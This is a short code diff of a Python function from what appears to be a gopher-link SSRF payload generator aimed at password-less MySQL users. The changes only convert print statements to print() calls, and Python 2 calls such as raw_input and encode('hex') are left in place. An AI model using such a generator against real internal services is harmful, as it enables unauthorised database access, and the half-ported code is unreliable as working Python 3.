@@ -1,6 +1,6 @@
 
 def MySQL():
-    print "\033[31m"+"For making it work username should not be password protected!!!"+ "\033[0m"
+    print("\033[31m"+"For making it work username should not be password protected!!!"+ "\033[0m")
     user = raw_input("\033[96m" +"\nGive MySQL username: " + "\033[0m")
     encode_user = user.encode("hex")
     user_length = len(user)
@@ -33,6 +33,6 @@ def MySQL():
         else:
             return encode(auth)
 
-    print "\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m"
-    print "\033[04m" + get_payload(query)+ "\033[0m"
-    print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
+    print("\033[93m" +"\nYour gopher link is ready to do SSRF : \n" + "\033[0m")
+    print("\033[04m" + get_payload(query)+ "\033[0m")
+    print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
